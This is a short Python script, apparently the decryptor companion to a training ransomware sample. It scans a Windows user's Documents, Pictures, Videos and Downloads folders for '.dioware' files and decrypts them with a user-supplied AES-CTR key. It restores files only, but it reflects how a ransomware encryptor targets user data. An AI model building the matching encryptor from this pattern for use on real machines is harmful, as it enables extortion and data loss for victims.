import os
import pyaes

def decrypt_file(file_path, key):
    try:
        with open(file_path, "rb") as file:
            file_data = file.read()

        aes = pyaes.AESModeOfOperationCTR(key)
        decrypt_data = aes.decrypt(file_data)

        os.remove(file_path)

        new_file_name = file_path.replace(".dioware", "") 
        with open(new_file_name, 'wb') as new_file:
            new_file.write(decrypt_data)

        print(f"Arquivo descriptografado com sucesso: {new_file_name}")
    except Exception as e:
        print(f"Erro ao descriptografar o arquivo {file_path}: {e}")

def decrypt_user_files(username):
    directories_to_decrypt = [
        f"C:/Users/{username}/Documents",
        f"C:/Users/{username}/Pictures",
        f"C:/Users/{username}/Videos",
        f"C:/Users/{username}/Downloads"
    ]
    
    key = input('Informe a chave: ')

    for directory in directories_to_decrypt:
        if os.path.exists(directory):
            for root, dirs, files in os.walk(directory):
                for file in files:
                    if file.endswith(".dioware"):  
                        file_path = os.path.join(root, file)
                        decrypt_file(file_path, key)
        else:
            print(f"Diretório não encontrado: {directory}")

username = os.getlogin()
decrypt_user_files(username)
